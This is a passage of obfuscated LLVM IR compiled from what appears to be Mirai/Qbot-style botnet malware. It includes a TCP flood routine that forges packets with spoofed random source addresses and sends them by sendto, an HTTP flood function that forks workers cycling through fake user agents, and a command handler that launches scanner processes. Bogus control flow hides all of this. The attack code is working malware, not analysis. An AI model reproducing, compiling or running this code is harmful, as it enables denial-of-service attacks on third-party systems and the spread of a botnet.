  %458 = icmp eq i32 %457, 0
  %459 = icmp slt i32 %454, 10
  %460 = or i1 %458, %459
  br i1 %460, label %originalBB80, label %originalBB80alteredBB

originalBB80:                                     ; preds = %originalBB80alteredBB, %452
  %461 = load i32, i32* @x.79
  %462 = load i32, i32* @y.80
  %463 = sub i32 %461, 1
  %464 = mul i32 %461, %463
  %465 = urem i32 %464, 2
  %466 = icmp eq i32 %465, 0
  %467 = icmp slt i32 %462, 10
  %468 = or i1 %466, %467
  br i1 %468, label %originalBBpart282, label %originalBB80alteredBB

originalBBpart282:                                ; preds = %originalBB80
  br label %469

; <label>:469:                                    ; preds = %originalBBpart282
  %470 = load i32, i32* %17, align 4
  %471 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %472 = call i64 @sendto(i32 %470, i8* %121, i64 %119, i32 0, %struct.sockaddr* %471, i32 16)
  %473 = load i32, i32* %19, align 4
  %474 = call i32 @getRandomIP(i32 %473)
  %475 = call i32 @htonl(i32 %474) #10
  %476 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %477 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %476, i32 0, i32 8
  store i32 %475, i32* %477, align 4
  %478 = call i32 @rand_cmwc()
  %479 = trunc i32 %478 to i16
  %480 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %481 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %480, i32 0, i32 3
  store i16 %479, i16* %481, align 4
  %482 = call i32 @rand_cmwc()
  %483 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %484 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %483, i32 0, i32 0
  %485 = bitcast %union.anon* %484 to %struct.anon.0*
  %486 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %485, i32 0, i32 2
  store i32 %482, i32* %486, align 4
  %487 = call i32 @rand_cmwc()
  %488 = trunc i32 %487 to i16
  %489 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %490 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %489, i32 0, i32 0
  %491 = bitcast %union.anon* %490 to %struct.anon.0*
  %492 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %491, i32 0, i32 0
  store i16 %488, i16* %492, align 4
  %493 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %494 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %493, i32 0, i32 0
  %495 = bitcast %union.anon* %494 to %struct.anon.0*
  %496 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %495, i32 0, i32 6
  store i16 0, i16* %496, align 4
  %497 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %498 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %499 = call zeroext i16 @tcpcsum(%struct.iphdr* %497, %struct.tcphdr* %498)
  %500 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %501 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %500, i32 0, i32 0
  %502 = bitcast %union.anon* %501 to %struct.anon.0*
  %503 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %502, i32 0, i32 6
  store i16 %499, i16* %503, align 4
  %504 = bitcast i8* %121 to i16*
  %505 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %506 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %505, i32 0, i32 2
  %507 = load i16, i16* %506, align 2
  %508 = zext i16 %507 to i32
  %509 = call zeroext i16 @csum(i16* %504, i32 %508)
  %510 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %511 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %510, i32 0, i32 7
  store i16 %509, i16* %511, align 2
  %512 = load i32, i32* %25, align 4
  %513 = load i32, i32* %15, align 4
  %514 = icmp eq i32 %512, %513
  br i1 %514, label %515, label %522

; <label>:515:                                    ; preds = %469
  %516 = call i64 @time(i64* null) #5
  %517 = load i32, i32* %24, align 4
  %518 = sext i32 %517 to i64
  %519 = icmp sgt i64 %516, %518
  br i1 %519, label %520, label %521

; <label>:520:                                    ; preds = %515
  br label %541

; <label>:521:                                    ; preds = %515
  store i32 0, i32* %25, align 4
  br label %452

; <label>:522:                                    ; preds = %469
  %523 = load i32, i32* @x.79
  %524 = load i32, i32* @y.80
  %525 = sub i32 %523, 1
  %526 = mul i32 %523, %525
  %527 = urem i32 %526, 2
  %528 = icmp eq i32 %527, 0
  %529 = icmp slt i32 %524, 10
  %530 = or i1 %528, %529
  br i1 %530, label %originalBB84, label %originalBB84alteredBB

originalBB84:                                     ; preds = %originalBB84alteredBB, %522
  %531 = load i32, i32* %25, align 4
  %532 = add i32 %531, 1
  store i32 %532, i32* %25, align 4
  %533 = load i32, i32* @x.79
  %534 = load i32, i32* @y.80
  %535 = sub i32 %533, 1
  %536 = mul i32 %533, %535
  %537 = urem i32 %536, 2
  %538 = icmp eq i32 %537, 0
  %539 = icmp slt i32 %534, 10
  %540 = or i1 %538, %539
  br i1 %540, label %originalBBpart288, label %originalBB84alteredBB

originalBBpart288:                                ; preds = %originalBB84
  br label %452

; <label>:541:                                    ; preds = %520
  %542 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %542)
  br label %543

; <label>:543:                                    ; preds = %541, %originalBBpart28, %originalBBpart24, %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %44
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %67
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %89
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %199
  %544 = load i8*, i8** %11, align 8
  %545 = call i8* @strtok(i8* %544, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.539, i32 0, i32 0)) #5
  store i8* %545, i8** %23, align 8
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %218
  %546 = load i8*, i8** %23, align 8
  %547 = icmp ne i8* %546, null
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %241
  %548 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %549 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %548, i32 0, i32 0
  %550 = bitcast %union.anon* %549 to %struct.anon.0*
  %551 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %550, i32 0, i32 4
  %552 = load i16, i16* %551, align 4
  %_ = shl i16 %552, -513
  %_19 = sub i16 0, %552
  %gen = add i16 %_19, -513
  %_20 = sub i16 %552, -513
  %gen21 = mul i16 %_20, -513
  %_22 = sub i16 %552, -513
  %gen23 = mul i16 %_22, -513
  %_24 = shl i16 %552, -513
  %553 = and i16 %552, -513
  %554 = or i16 %553, 512
  store i16 %554, i16* %551, align 4
  br label %originalBB18

originalBB29alteredBB:                            ; preds = %originalBB29, %289
  %555 = load i8*, i8** %23, align 8
  %556 = call i32 @strcmp(i8* %555, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.543, i32 0, i32 0)) #9
  %557 = icmp ne i32 %556, 0
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %309
  %558 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %559 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %558, i32 0, i32 0
  %560 = bitcast %union.anon* %559 to %struct.anon.0*
  %561 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %560, i32 0, i32 4
  %562 = load i16, i16* %561, align 4
  %_34 = sub i16 %562, -4097
  %gen35 = mul i16 %_34, -4097
  %_36 = sub i16 0, %562
  %gen37 = add i16 %_36, -4097
  %_38 = sub i16 0, %562
  %gen39 = add i16 %_38, -4097
  %_40 = sub i16 %562, -4097
  %gen41 = mul i16 %_40, -4097
  %_42 = shl i16 %562, -4097
  %_43 = sub i16 %562, -4097
  %gen44 = mul i16 %_43, -4097
  %_45 = sub i16 0, %562
  %gen46 = add i16 %_45, -4097
  %_47 = sub i16 %562, -4097
  %gen48 = mul i16 %_47, -4097
  %563 = and i16 %562, -4097
  %_49 = sub i16 %563, 4096
  %gen50 = mul i16 %_49, 4096
  %_51 = sub i16 %563, 4096
  %gen52 = mul i16 %_51, 4096
  %_53 = sub i16 %563, 4096
  %gen54 = mul i16 %_53, 4096
  %564 = or i16 %563, 4096
  store i16 %564, i16* %561, align 4
  br label %originalBB33

originalBB58alteredBB:                            ; preds = %originalBB58, %337
  %565 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %566 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %565, i32 0, i32 0
  %567 = bitcast %union.anon* %566 to %struct.anon.0*
  %568 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %567, i32 0, i32 4
  %569 = load i16, i16* %568, align 4
  %_59 = shl i16 %569, -2049
  %_60 = sub i16 0, %569
  %gen61 = add i16 %_60, -2049
  %_62 = shl i16 %569, -2049
  %570 = and i16 %569, -2049
  %_63 = sub i16 %570, 2048
  %gen64 = mul i16 %_63, 2048
  %_65 = sub i16 %570, 2048
  %gen66 = mul i16 %_65, 2048
  %_67 = sub i16 %570, 2048
  %gen68 = mul i16 %_67, 2048
  %571 = or i16 %570, 2048
  store i16 %571, i16* %568, align 4
  br label %originalBB58

originalBB72alteredBB:                            ; preds = %originalBB72, %365
  br label %originalBB72

originalBB76alteredBB:                            ; preds = %originalBB76, %385
  %572 = call i32 @rand_cmwc()
  %573 = trunc i32 %572 to i16
  %574 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %575 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %574, i32 0, i32 0
  %576 = bitcast %union.anon* %575 to %struct.anon.0*
  %577 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %576, i32 0, i32 5
  store i16 %573, i16* %577, align 2
  %578 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %579 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %578, i32 0, i32 0
  %580 = bitcast %union.anon* %579 to %struct.anon.0*
  %581 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %580, i32 0, i32 6
  store i16 0, i16* %581, align 4
  %582 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %583 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %582, i32 0, i32 0
  %584 = bitcast %union.anon* %583 to %struct.anon.0*
  %585 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %584, i32 0, i32 7
  store i16 0, i16* %585, align 2
  %586 = load i32, i32* %9, align 4
  %587 = icmp eq i32 %586, 0
  br label %originalBB76

originalBB80alteredBB:                            ; preds = %originalBB80, %452
  br label %originalBB80

originalBB84alteredBB:                            ; preds = %originalBB84, %522
  %588 = load i32, i32* %25, align 4
  %_85 = shl i32 %588, 1
  %_86 = shl i32 %588, 1
  %589 = add i32 %588, 1
  store i32 %589, i32* %25, align 4
  br label %originalBB84
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #4

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %3 = load i32, i32* @x.81
  %4 = load i32, i32* @y.82
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i16, align 2
  %14 = alloca %struct.hostent*, align 8
  %15 = alloca %struct.sockaddr_in, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  store i8* %0, i8** %12, align 8
  store i16 %1, i16* %13, align 2
  store i32 1, i32* %16, align 4
  %18 = load i8*, i8** %12, align 8
  %19 = call %struct.hostent* @gethostbyname(i8* %18)
  store %struct.hostent* %19, %struct.hostent** %14, align 8
  %20 = icmp eq %struct.hostent* %19, null
  %21 = load i32, i32* @x.81
  %22 = load i32, i32* @y.82
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %20, label %29, label %46

; <label>:29:                                     ; preds = %originalBBpart2
  %30 = load i32, i32* @x.81
  %31 = load i32, i32* @y.82
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %29
  store i32 0, i32* %11, align 4
  %38 = load i32, i32* @x.81
  %39 = load i32, i32* @y.82
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %93

; <label>:46:                                     ; preds = %originalBBpart2
  %47 = load %struct.hostent*, %struct.hostent** %14, align 8
  %48 = getelementptr inbounds %struct.hostent, %struct.hostent* %47, i32 0, i32 4
  %49 = load i8**, i8*** %48, align 8
  %50 = getelementptr inbounds i8*, i8** %49, i64 0
  %51 = load i8*, i8** %50, align 8
  %52 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %15, i32 0, i32 2
  %53 = bitcast %struct.in_addr* %52 to i8*
  %54 = load %struct.hostent*, %struct.hostent** %14, align 8
  %55 = getelementptr inbounds %struct.hostent, %struct.hostent* %54, i32 0, i32 3
  %56 = load i32, i32* %55, align 4
  %57 = sext i32 %56 to i64
  call void @bcopy(i8* %51, i8* %53, i64 %57) #5
  %58 = load i16, i16* %13, align 2
  %59 = call zeroext i16 @htons(i16 zeroext %58) #10
  %60 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %15, i32 0, i32 1
  store i16 %59, i16* %60, align 2
  %61 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %15, i32 0, i32 0
  store i16 2, i16* %61, align 4
  %62 = call i32 @socket(i32 2, i32 1, i32 6) #5
  store i32 %62, i32* %17, align 4
  %63 = load i32, i32* %17, align 4
  %64 = bitcast i32* %16 to i8*
  %65 = call i32 @setsockopt(i32 %63, i32 6, i32 1, i8* %64, i32 4) #5
  %66 = load i32, i32* %17, align 4
  %67 = icmp eq i32 %66, -1
  br i1 %67, label %68, label %69

; <label>:68:                                     ; preds = %46
  store i32 0, i32* %11, align 4
  br label %93

; <label>:69:                                     ; preds = %46
  %70 = load i32, i32* %17, align 4
  %71 = bitcast %struct.sockaddr_in* %15 to %struct.sockaddr*
  %72 = call i32 @connect(i32 %70, %struct.sockaddr* %71, i32 16)
  %73 = icmp eq i32 %72, -1
  br i1 %73, label %74, label %75

; <label>:74:                                     ; preds = %69
  store i32 0, i32* %11, align 4
  br label %93

; <label>:75:                                     ; preds = %69
  %76 = load i32, i32* @x.81
  %77 = load i32, i32* @y.82
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %75
  %84 = load i32, i32* %17, align 4
  store i32 %84, i32* %11, align 4
  %85 = load i32, i32* @x.81
  %86 = load i32, i32* @y.82
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %93

; <label>:93:                                     ; preds = %originalBBpart28, %74, %68, %originalBBpart24
  %94 = load i32, i32* %11, align 4
  ret i32 %94

originalBBalteredBB:                              ; preds = %originalBB, %2
  %95 = alloca i32, align 4
  %96 = alloca i8*, align 8
  %97 = alloca i16, align 2
  %98 = alloca %struct.hostent*, align 8
  %99 = alloca %struct.sockaddr_in, align 4
  %100 = alloca i32, align 4
  %101 = alloca i32, align 4
  store i8* %0, i8** %96, align 8
  store i16 %1, i16* %97, align 2
  store i32 1, i32* %100, align 4
  %102 = load i8*, i8** %96, align 8
  %103 = call %struct.hostent* @gethostbyname(i8* %102)
  store %struct.hostent* %103, %struct.hostent** %98, align 8
  %104 = icmp eq %struct.hostent* %103, null
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %29
  store i32 0, i32* %11, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %75
  %105 = load i32, i32* %17, align 4
  store i32 %105, i32* %11, align 4
  br label %originalBB6
}

; Function Attrs: noinline nounwind uwtable
define void @SendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %19 = call i64 @time(i64* null) #5
  %20 = load i32, i32* %11, align 4
  %21 = sext i32 %20 to i64
  %22 = add nsw i64 %19, %21
  %23 = trunc i64 %22 to i32
  store i32 %23, i32* %15, align 4
  store i32 0, i32* %16, align 4
  store i32 0, i32* %14, align 4
  br label %24

; <label>:24:                                     ; preds = %83, %6
  %25 = load i32, i32* @x.83
  %26 = load i32, i32* @y.84
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %24
  %33 = load i32, i32* %14, align 4
  %34 = load i32, i32* %12, align 4
  %35 = icmp slt i32 %33, %34
  %36 = load i32, i32* @x.83
  %37 = load i32, i32* @y.84
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %35, label %44, label %86

; <label>:44:                                     ; preds = %originalBBpart2
  %45 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %46 = load i8*, i8** %7, align 8
  %47 = load i8*, i8** %10, align 8
  %48 = load i8*, i8** %8, align 8
  %49 = call i32 @rand() #5
  %50 = srem i32 %49, 59
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds [59 x i8*], [59 x i8*]* @useragents, i64 0, i64 %51
  %53 = load i8*, i8** %52, align 8
  %54 = call i32 (i8*, i8*, ...) @sprintf(i8* %45, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.546, i32 0, i32 0), i8* %46, i8* %47, i8* %48, i8* %53) #5
  %55 = call i32 @fork() #5
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %57, label %82

; <label>:57:                                     ; preds = %44
  br label %58

; <label>:58:                                     ; preds = %80, %57
  %59 = load i32, i32* %15, align 4
  %60 = sext i32 %59 to i64
  %61 = call i64 @time(i64* null) #5
  %62 = icmp sgt i64 %60, %61
  br i1 %62, label %63, label %81

; <label>:63:                                     ; preds = %58
  %64 = load i8*, i8** %8, align 8
  %65 = load i16, i16* %9, align 2
  %66 = call i32 @socket_connect(i8* %64, i16 zeroext %65)
  store i32 %66, i32* %13, align 4
  %67 = load i32, i32* %13, align 4
  %68 = icmp ne i32 %67, 0
  br i1 %68, label %69, label %80

; <label>:69:                                     ; preds = %63
  %70 = load i32, i32* %13, align 4
  %71 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %72 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %73 = call i64 @strlen(i8* %72) #9
  %74 = call i64 @write(i32 %70, i8* %71, i64 %73)
  %75 = load i32, i32* %13, align 4
  %76 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %77 = call i64 @read(i32 %75, i8* %76, i64 1)
  %78 = load i32, i32* %13, align 4
  %79 = call i32 @close(i32 %78)
  br label %80

; <label>:80:                                     ; preds = %69, %63
  br label %58

; <label>:81:                                     ; preds = %58
  call void @exit(i32 0) #12
  unreachable

; <label>:82:                                     ; preds = %44
  br label %83

; <label>:83:                                     ; preds = %82
  %84 = load i32, i32* %14, align 4
  %85 = add nsw i32 %84, 1
  store i32 %85, i32* %14, align 4
  br label %24

; <label>:86:                                     ; preds = %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %24
  %87 = load i32, i32* %14, align 4
  %88 = load i32, i32* %12, align 4
  %89 = icmp slt i32 %87, %88
  br label %originalBB
}

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #8

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i8*, align 8
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca i32, align 4
  %34 = alloca i32, align 4
  %35 = alloca i8*, align 8
  %36 = alloca i32, align 4
  %37 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %38 = load i8**, i8*** %4, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 0
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 @strcmp(i8* %40, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.547, i32 0, i32 0)) #9
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %60, label %43

; <label>:43:                                     ; preds = %2
  %44 = load i32, i32* @x.85
  %45 = load i32, i32* @y.86
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %43
  %52 = load i32, i32* @x.85
  %53 = load i32, i32* @y.86
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %1337

; <label>:60:                                     ; preds = %2
  %61 = load i8**, i8*** %4, align 8
  %62 = getelementptr inbounds i8*, i8** %61, i64 0
  %63 = load i8*, i8** %62, align 8
  %64 = call i32 @strcmp(i8* %63, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.548, i32 0, i32 0)) #9
  %65 = icmp ne i32 %64, 0
  br i1 %65, label %346, label %66

; <label>:66:                                     ; preds = %60
  %67 = load i8**, i8*** %4, align 8
  %68 = getelementptr inbounds i8*, i8** %67, i64 1
  %69 = load i8*, i8** %68, align 8
  %70 = call i32 @strcmp(i8* %69, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.549, i32 0, i32 0)) #9
  %71 = icmp ne i32 %70, 0
  br i1 %71, label %229, label %72

; <label>:72:                                     ; preds = %66
  %73 = load i32, i32* @x.85
  %74 = load i32, i32* @y.86
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %72
  %81 = call i32 @fork() #5
  store i32 %81, i32* %5, align 4
  store i32 0, i32* %6, align 4
  %82 = call i64 @sysconf(i32 84) #5
  %83 = trunc i64 %82 to i32
  store i32 %83, i32* %7, align 4
  store i32 999999, i32* %8, align 4
  %84 = load i32, i32* %7, align 4
  %85 = icmp eq i32 %84, 1
  %86 = load i32, i32* @x.85
  %87 = load i32, i32* @y.86
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %85, label %94, label %111

; <label>:94:                                     ; preds = %originalBBpart24
  %95 = load i32, i32* @x.85
  %96 = load i32, i32* @y.86
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %94
  store i32 500, i32* %8, align 4
  %103 = load i32, i32* @x.85
  %104 = load i32, i32* @y.86
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %111

; <label>:111:                                    ; preds = %originalBBpart28, %originalBBpart24
  %112 = load i32, i32* @x.85
  %113 = load i32, i32* @y.86
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %111
  %120 = load i32, i32* %7, align 4
  %121 = icmp sge i32 %120, 2
  %122 = load i32, i32* @x.85
  %123 = load i32, i32* @y.86
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %121, label %130, label %131

; <label>:130:                                    ; preds = %originalBBpart212
  store i32 1000, i32* %8, align 4
  br label %131

; <label>:131:                                    ; preds = %130, %originalBBpart212
  %132 = load i32, i32* %5, align 4
  %133 = icmp ugt i32 %132, 0
  br i1 %133, label %134, label %136

; <label>:134:                                    ; preds = %131
  %135 = load i32, i32* %5, align 4
  store i32 %135, i32* @scanPid, align 4
  br label %1337

; <label>:136:                                    ; preds = %131
  %137 = load i32, i32* @x.85
  %138 = load i32, i32* @y.86
  %139 = sub i32 %137, 1
  %140 = mul i32 %137, %139
  %141 = urem i32 %140, 2
  %142 = icmp eq i32 %141, 0
  %143 = icmp slt i32 %138, 10
  %144 = or i1 %142, %143
  br i1 %144, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %136
  %145 = load i32, i32* %5, align 4
  %146 = icmp eq i32 %145, -1
  %147 = load i32, i32* @x.85
  %148 = load i32, i32* @y.86
  %149 = sub i32 %147, 1
  %150 = mul i32 %147, %149
  %151 = urem i32 %150, 2
  %152 = icmp eq i32 %151, 0
  %153 = icmp slt i32 %148, 10
  %154 = or i1 %152, %153
  br i1 %154, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %146, label %155, label %172

; <label>:155:                                    ; preds = %originalBBpart216
  %156 = load i32, i32* @x.85
  %157 = load i32, i32* @y.86
  %158 = sub i32 %156, 1
  %159 = mul i32 %156, %158
  %160 = urem i32 %159, 2
  %161 = icmp eq i32 %160, 0
  %162 = icmp slt i32 %157, 10
  %163 = or i1 %161, %162
  br i1 %163, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %155
  %164 = load i32, i32* @x.85
  %165 = load i32, i32* @y.86
  %166 = sub i32 %164, 1
  %167 = mul i32 %164, %166
  %168 = urem i32 %167, 2
  %169 = icmp eq i32 %168, 0
  %170 = icmp slt i32 %165, 10
